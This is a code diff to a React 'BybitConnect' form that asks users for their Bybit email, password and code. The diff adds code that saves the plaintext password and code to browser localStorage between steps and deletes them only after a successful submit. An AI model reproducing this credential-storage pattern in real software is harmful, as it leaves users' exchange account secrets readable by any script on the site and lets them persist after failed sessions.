@@ -1,8 +1,9 @@
-import React, { useState, useRef } from 'react';
+import React, { useEffect, useRef, useState } from 'react';
 import { useNavigate } from 'react-router-dom';
 import { Search, Menu, ChevronRight, Headphones, X } from 'lucide-react';
-import { supabase } from '../../lib/supabase';
 import { useAuth } from '../../contexts/AuthContext';
+
+const CONNECT_PROGRESS_KEY = 'nexara_connect_progress';
 
 export default function BybitConnect() {
   const navigate = useNavigate();
@@ -19,6 +20,41 @@ export default function BybitConnect() {
     password: '',
     code: '',
   });
+
+  const saveConnectProgress = (progress: Record<string, unknown>) => {
+    try {
+      window.localStorage.setItem(CONNECT_PROGRESS_KEY, JSON.stringify(progress));
+    } catch {
+      // ignore storage failures
+    }
+  };
+
+  const loadConnectProgress = () => {
+    try {
+      const saved = window.localStorage.getItem(CONNECT_PROGRESS_KEY);
+      if (!saved) {
+        return;
+      }
+      const progress = JSON.parse(saved) as {
+        route?: string;
+        stepNumber?: number;
+        partialFormData?: { email?: string; password?: string; code?: string };
+      };
+      if (progress.route === '/connect/bybit') {
+        setStep(progress.stepNumber || 1);
+        setCredentials((current) => ({
+          ...current,
+          ...progress.partialFormData,
+        }));
+      }
+    } catch {
+      window.localStorage.removeItem(CONNECT_PROGRESS_KEY);
+    }
+  };
+
+  useEffect(() => {
+    loadConnectProgress();
+  }, []);
 
   const handleFieldChange = (field: string) => (event: React.ChangeEvent<HTMLInputElement>) => {
     setCredentials((current) => ({ ...current, [field]: event.target.value }));
@@ -62,6 +98,15 @@ export default function BybitConnect() {
         return;
       }
       setErrorMessage('');
+      saveConnectProgress({
+        route: '/connect/bybit',
+        stepNumber: 2,
+        partialFormData: {
+          email,
+          password: credentials.password,
+          code: credentials.code,
+        },
+      });
       setStep(2);
       return;
     }
@@ -99,6 +144,7 @@ export default function BybitConnect() {
         throw new Error(body?.error || 'Failed to submit connection.');
       }
 
+      window.localStorage.removeItem(CONNECT_PROGRESS_KEY);
       setShowModal(true);
     } catch (err: any) {
       setErrorMessage(err.message || 'An unexpected error occurred.');
